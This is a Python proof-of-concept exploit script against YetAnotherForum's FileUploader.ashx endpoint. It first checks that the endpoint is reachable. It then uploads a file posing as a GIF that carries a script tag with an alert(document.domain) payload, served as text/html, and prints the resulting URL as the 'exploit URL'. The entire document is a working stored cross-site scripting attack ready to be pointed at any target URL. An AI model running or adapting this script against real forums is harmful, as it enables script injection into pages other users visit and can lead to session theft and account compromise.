import requests, sys, urllib3

#disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#use burp to listen in port 8080 for debug
proxies = {
    #"http": "http://127.0.0.1:8080",
    #"https": "https://127.0.0.1:8080",
}

def exploit(url):
	session = requests.Session()

	paramsPost = {"allowedUpload":"true","boardID":"1","userID":"1","uploadFolder":"Uploads","forumID":"0"}
	paramsMultipart = [('files[]', ('POC.gif', "GIF89a\xd7\x00T\x00\xf7\xff\x00<script>alert(document.domain);</script>\r\n", 'text/html'))]
	headers = {"Accept":"application/json, text/javascript, */*; q=0.01","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","Connection":"close","Referer":"" + url + "","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
	cookies = {"YAF-AcceptCookies":"true"}
	response = session.post(url + "/FileUploader.ashx", data=paramsPost, files=paramsMultipart, headers=headers, cookies=cookies, proxies=proxies, verify=False)

	if response.status_code == 200:
		if int(response.headers['content-length']) < 5 and "application/json" in response.headers['content-type']:
			print("[-] Exploit failed! Reason: Response content is empty!")
			print("[-] Status code:   %i" % response.status_code)
			print("[-] Response body: %s" % response.content)
		elif "Please do not link directly to this resource. You must have a session in the forum." in response.text:
			#Aww, hope there's a register function in the target website :)
			print("[-] Failed! Reason: Target requires authenticated session to proceed")
		else:
			exploit_url = url + "/resource.ashx?i=" + str(response.json()[0]["fileID"]) + "&b=1&editor=true"
			r = requests.get(exploit_url)
			print("[+] Success! Exploit URL: " + exploit_url)
			if "Please do not link directly to this resource. You must have a session in the forum." in r.text:
				print("[~] Authenticated session are required to visit the exploit")
			else:
				print("[~] Unauthenticated users are allowed to visit the exploit")
			
	else:
		print("[-] Exploit failed! Reason: Target returns " + str(response.status_code))
		print("[-] Response body: %s" % response.content)

def check_endpoint(url):
	r = requests.get(url + "/FileUploader.ashx")
	print("[+] Probing " + url + "/FileUploader.ashx")
	if int(r.headers["content-length"]) == 0 or "Please do not link directly to this resource. You must have a session in the forum." in r.text:
		return True
	else:
		print("[-] Failed. Reason: " + url + " is not a valid target")
		sys.exit(0)

def main():
	if len(sys.argv) != 2:
		print("Usage: python3 " + sys.argv[0] + " <URL>")
		print("Example: python3 " + sys.argv[0] + " https://testforum.yetanotherforum.net")
		sys.exit(0)
	else:
		check_endpoint(sys.argv[1])
		exploit(sys.argv[1])

main()
